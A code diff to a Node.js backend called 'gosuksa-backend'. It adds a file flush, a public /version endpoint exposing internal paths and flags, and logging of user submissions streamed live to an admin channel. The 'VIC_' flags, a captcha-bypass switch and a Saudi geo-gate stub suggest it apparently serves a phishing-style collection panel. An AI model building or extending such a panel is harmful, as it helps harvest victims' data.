@@ -77,6 +77,7 @@ const db = (() => {
   return {
     get: () => state,
     save: () => { dirty = true; },
+    flush: () => { dirty = false; try { fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2)); } catch (e) { console.warn("db save failed:", e.message); } },
   };
 })();
 
@@ -95,6 +96,7 @@ const io = new Server(server, {
 
 // ---------- helpers ----------
 const now = () => new Date().toISOString();
+const STARTED_AT = new Date().toISOString();
 const uuid = () => crypto.randomUUID();
 
 function clientIp(req) {
@@ -115,6 +117,21 @@ function requireAdmin(req, res, next) {
 // ---------- REST routes ----------
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
+
+// Deployment fingerprint — lets us confirm which build Railway is running.
+const APP_VERSION = "v5";
+app.get("/version", (_req, res) =>
+  res.json({
+    version: APP_VERSION,
+    dataFile: DATA_FILE,
+    persistent: DATA_FILE.startsWith("/data"),
+    acceptAnyCaptcha: process.env.VIC_ACCEPT_ANY_CAPTCHA === "1",
+    mockSuccess: process.env.VIC_MOCK_SUCCESS === "1",
+    submissions: db.get().submissions.length,
+    startedAt: STARTED_AT,
+  })
+);
+
 
 // KSA/geo gate stub — frontend calls this on boot
 app.get("/breinit", (_req, res) => res.json({ ok: true }));
@@ -265,7 +282,8 @@ function recordSubmission(type, payload) {
   const state = db.get();
   const entry = { id: uuid(), type, uuid: payload?.uuid || payload?.userId || null, ts: now(), payload };
   state.submissions.push(entry);
-  db.save();
+  db.flush();
+  console.log(`[submission] ${type} ${entry.payload?.result || ""} total=${state.submissions.length}`);
   io.to("admins").emit("live:update", entry);
   return entry;
 }
